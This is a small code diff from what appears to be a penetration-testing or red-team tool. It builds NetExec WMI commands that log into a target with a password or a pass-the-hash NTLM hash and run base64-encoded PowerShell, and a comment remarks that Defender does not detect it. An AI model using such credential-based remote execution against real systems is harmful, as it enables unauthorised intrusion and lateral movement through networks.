@@ -231,9 +231,9 @@ def build_cmd(tool, user, target, credential, command):
     if tool == "wmi":
         # we don't actually need to pass the --no-output here, as defender won't catch it regardless it seems
         # additionally, adding --no-output makes it very difficult to differentiate between command execution and a successful authentication w/o execution
-        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -x 'powershell -enc {b64}'"
+        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}'"
                 if use_hash else
-                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'")
+                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}'")
 
     if tool == "ssh":
         if LINUX_MODE:
